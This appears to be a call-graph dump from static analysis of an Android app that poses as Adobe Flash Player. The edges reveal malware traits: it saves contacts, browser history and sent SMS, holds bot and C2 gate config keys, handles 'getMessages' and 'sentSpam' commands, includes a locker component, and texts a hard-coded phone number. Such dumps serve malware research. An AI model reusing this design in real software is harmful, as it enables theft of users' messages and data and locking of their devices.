VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "contacts.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("ON") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
STATIC edge: $r15 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>(r8, 0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashARM: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "browser_history.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)>(0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=calls&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotNetwork", r8) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke $r21.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r14.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("macros[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("warn", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>("+79037676840", r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>("forcelock", $r1) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onActivityResult(int,int,android.content.Intent)>($i0, $i1, $r1) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.app.Activity: void onActivityResult(int,int,android.content.Intent)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotNetwork", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "pcss.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>($r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r9, r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "getMessages:SMSGATE", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void <init>()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_ServerGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotID", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
